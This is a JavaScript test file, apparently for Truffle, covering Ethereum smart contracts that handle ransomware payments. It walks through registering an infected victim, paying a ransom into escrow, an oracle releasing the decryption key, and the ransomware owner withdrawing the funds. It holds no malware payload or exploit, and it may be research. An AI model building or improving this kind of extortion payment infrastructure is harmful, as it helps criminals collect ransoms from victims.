
let Ransom = artifacts.require("./ZeroRansom.sol");
let Escrow = artifacts.require("./Escrow.sol");
let Registry = artifacts.require("./Registry.sol");

console.log("Testing;")

contract("Simple Straight forward transaction", async (accounts) => {


    // Some shortcut functions to save on typing
    let fw = web3.utils.fromWei;
    let tw = web3.utils.toWei;
    let tbn = web3.utils.toBN;
    let gb = web3.eth.getBalance;
    let lg = console.log;


    // three smart contracts under test
    let escrow;
    let registry;
    let ransom

    // accounts that we will use
    let owner = accounts[0];    // owner of ransomware,  final recepient of all ransoms
    let oracle = accounts[1];   // off chain daemon 
    let victim = accounts[2];   // infected person

    let victimId = 0x5500;   // Victim ID
    let ransomAmount = tw('0', 'wei'); // Ransom Amount

    let ttlBalBefore = 0;

    


    before( async () => {

        // Deploy contracts
        registry = await Registry.new(oracle, {from: owner});
        escrow = await Escrow.new(registry.address, oracle, {from: owner});
        ransom = await Ransom.new(victimId, "Hello", victim, registry.address, 55);

        lg('owner="'+owner+'"');

    } );

    it('Record balance at start', async () => {
        
        let currentBal = tbn(await gb(owner)).add(tbn(await gb(victim)));
        console.log('Initial Balance:', fw(currentBal, 'ether'));
    
    });

    it('Can Control authentication rate', async () => {

        await registry.setMaxPending(0, {from: owner} );

    });

    it('Can Register victim', async () => {

        await registry.authCallback(victimId, ransom.address, escrow.address, true, {from: oracle} );

        let cnt = await registry.victimCount();
        
        assert.equal(cnt, 1);

    });

    it('Can retrieve ransom addr for victim', async () => {

        let rv_ransom = await registry.getRansomAddressForVictim(0x5500);
        assert.equal(rv_ransom, ransom.address);

    });

    it('Registry knows escrow addr for victim', async() => {

        let rv_escrow = await registry.getEscrowAddressForVictim(0x5500);
        assert.equal(rv_escrow, escrow.address);

    });

    it('Ransom knows escrow addr', async() => {

        let rv_escrow = await ransom.getEscrowAddress();
        assert.equal(rv_escrow, escrow.address);

    });

    it('At this point ransom should be authenticated', async() => {
        let rv_auth = await ransom.isAuthenticated();
        assert.isTrue(rv_auth);
    });

    it('Remember the balance' , async () => {

        ttlBalBefore = tbn(await gb(owner)).add(tbn(await gb(victim)));
        console.log('Balance before :', fw(ttlBalBefore, 'ether'));

    });

    it('After ransom is payed contract should be fulfilled', async() => {
        
        await escrow.payRansom(victimId, "DFDFFFD", 
                               {from: victim, value: ransomAmount});

        await escrow.decryptCallback(victimId, '0x01020304', true, {from: oracle} );

        let rv_filled = await ransom.isFulFilled();
        assert.isTrue(rv_filled);
    });

    it('Victim can retrieve key from fullfilled contract', async() => {
  
        let key = await ransom.getDecryptionKey({from: victim });

        assert.equal(key, '0x0102030400000000000000000000000000000000000000000000000000000000')

    });

    it('Owner can claim funds', async() => {

        let ownerIntialBalance =  await web3.eth.getBalance(owner);

        let rv = await escrow.withdrawFunds( owner,  ransomAmount, {from: owner});
        console.log(rv.tx);

        let ttlBalAfter = tbn(await gb(owner)).add(tbn(await gb(victim)));
        console.log('Balance after :', fw(ttlBalAfter, 'ether'));

        
        let ttlBalDiff = ttlBalBefore.sub(ttlBalAfter);
        console.log("Sum bal diff :", fw(ttlBalDiff, 'ether'));

        assert.isBelow(parseFloat(fw(ttlBalDiff)), 0.01);
        
    });



});